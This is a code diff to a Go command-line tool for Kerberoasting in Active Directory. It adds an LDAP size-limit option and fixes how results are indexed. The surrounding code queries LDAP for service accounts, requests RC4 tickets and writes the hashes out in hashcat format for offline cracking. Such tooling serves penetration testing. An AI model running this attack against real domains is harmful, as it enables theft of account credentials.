@@ -21,6 +21,7 @@ func init() {
 	var useLdap bool
 	var ldapUser string
 	var ldapPassword string
+	var ldapSizeLimit int
 	var enctype string
 	var username string
 	var password string
@@ -66,6 +67,8 @@ func init() {
 			return nil
 		},
 		RunE: func(cmd *cobra.Command, args []string) error {
+			printDomainInformation(domain, dcIp)
+
 			var tgtCred *krb5.KRBCred
 			targets := make([]spnTarget, 0)
 
@@ -78,6 +81,7 @@ func init() {
 
 				tgtCred = kirbi
 			} else {
+				fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
 				keyBytes, err := getKeyFlagValue(key)
 				if err != nil {
 					return err
@@ -114,7 +118,7 @@ func init() {
 
 				// TODO: search account with RC4 enabled (or AES128/256)
 				query := "(&(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
-				entries, err := ldapClient.Search(query, []string{"sAMAccountName", "servicePrincipalName", "distinguishedName"}, 1000)
+				entries, err := ldapClient.SearchWithSizeLimit(query, []string{"sAMAccountName", "servicePrincipalName", "distinguishedName"}, 1000)
 				if err != nil {
 					return err
 				}
@@ -131,7 +135,7 @@ func init() {
 					fmt.Printf("    distinguishedName   : %s\n", entry["distinguishedName"])
 					fmt.Printf("    servicePrincipalName: %s\n", entry["servicePrincipalName"])
 
-					targets = append(targets, spnTarget{username: entry["sAMAccountName"], spn: entry["servicePrincipalName"]})
+					targets = append(targets, spnTarget{username: entry["sAMAccountName"][0], spn: entry["servicePrincipalName"][0]})
 				}
 			}
 
@@ -172,7 +176,7 @@ func init() {
 	commandAddKerberosDomainFlags(kerberoastCmd, &domain, &dcIp)
 	commandAddDomainUserFlagsWithTicket(kerberoastCmd, &username, &password, &key, &ticket)
 	kerberoastCmd.Flags().BoolVarP(&useLdap, "ldap", "l", false, "Search targets on LDAP with username and password")
-	commandAddLDAPFlags(kerberoastCmd, &ldapUser, &ldapPassword)
+	commandAddLDAPFlags(kerberoastCmd, &ldapUser, &ldapPassword, &ldapSizeLimit)
 	commandAddKerberosETypeFlagWithDefaultValue(kerberoastCmd, &enctype, "rc4")
 	kerberoastCmd.Flags().StringVarP(&spn, "spn", "", "", "SPN to roast")
 	kerberoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the hashes to a file (hashcat mode 13100)")
